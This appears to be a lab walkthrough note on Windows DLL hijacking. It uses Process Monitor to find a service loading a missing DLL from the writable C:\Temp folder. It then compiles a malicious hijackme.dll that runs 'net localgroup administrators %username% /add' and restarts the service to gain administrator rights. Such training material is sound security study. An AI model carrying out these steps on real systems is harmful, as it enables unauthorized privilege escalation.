
**Detection**

try http://github.com/sensepost/rattler

---
Show DLL's tied to specific exe.
```command prompt - target
tasklist /m | findstr "nvcontainer.exe"
```


Open the Tools folder that is located on the desktop and then go the Process Monitor folder.  

In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.  

In procmon, select ‘Result’.  

In the input box on the same line type: 

```procmon - windows
NAME NOT FOUND  
```

Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’.


In procmon, select ‘Path’.  
In procmon, select ‘ends with'.  

In the input box on the same line type: 

```procmon - windows
.dll 
```

Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’, and lastly on ‘OK’.  

Open command prompt and type: 

```command prompt - target
sc start dllsvc  
```

Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

We have 2 results show up, 1 on "Program Files" and 1 in Temp.

![[Pasted image 20220207150415.png]]

**Exploitation**

Copy `C:\Users\User\Desktop\Tools\Source\windows_dll.c` to the Kali VM.

Open windows_dll.c in a text editor and replace the command used by the system() function to: 

```mousepad - kali
cmd.exe /k net localgroup administrators %username% /add
```

Exit the text editor and compile the file by typing the following in the command prompt: 

```bash - kali
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll  
```

Copy the generated file hijackme.dll, to the Windows target.

Place hijackme.dll in ‘C:\Temp’.  

Open command prompt and type: 

```command prompt - windows
sc stop dllsvc & sc start dllsvc
```

It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 

```command prompt - windows
net localgroup administrators
```
